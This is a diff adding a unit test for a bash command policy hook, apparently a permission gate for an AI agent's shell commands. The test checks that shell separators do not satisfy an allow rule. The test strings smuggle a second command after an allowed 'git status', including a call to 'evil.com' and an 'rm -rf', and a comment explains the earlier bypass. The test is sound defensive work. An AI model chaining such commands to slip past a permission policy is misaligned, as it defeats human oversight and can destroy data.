@@ -53,6 +53,31 @@ describe('createBashPolicyHook — pattern matching', () => {
     expect((await run(hook, makeInput('gitk'))).decision).toBe('deny');
   });
 
+  it('prefix match: shell separators do NOT count as boundary (Codex P1 round-2)', async () => {
+    // Pre-fix `:*` accepted `;&|<>` as a boundary, so an allow rule
+    // like `git:*` matched `git status; curl evil.com` and bash still
+    // ran the trailing command — a policy bypass in `default: 'deny'`
+    // posture. Boundary is now whitespace-only.
+    const hook = createBashPolicyHook({
+      allow: ['git:*'],
+      default: 'deny',
+    });
+    expect(
+      (await run(hook, makeInput('git status; curl evil.com'))).decision
+    ).toBe('deny');
+    expect(
+      (await run(hook, makeInput('git status && rm -rf /tmp'))).decision
+    ).toBe('deny');
+    expect((await run(hook, makeInput('git log | head -1'))).decision).toBe(
+      'deny'
+    );
+    expect((await run(hook, makeInput('git status > /tmp/out'))).decision).toBe(
+      'deny'
+    );
+    // Whitespace still works.
+    expect((await run(hook, makeInput('git status'))).decision).toBe('allow');
+  });
+
   it('prefix match: "git push:*" requires the full prefix', async () => {
     const hook = createBashPolicyHook({
       ask: ['git push:*'],
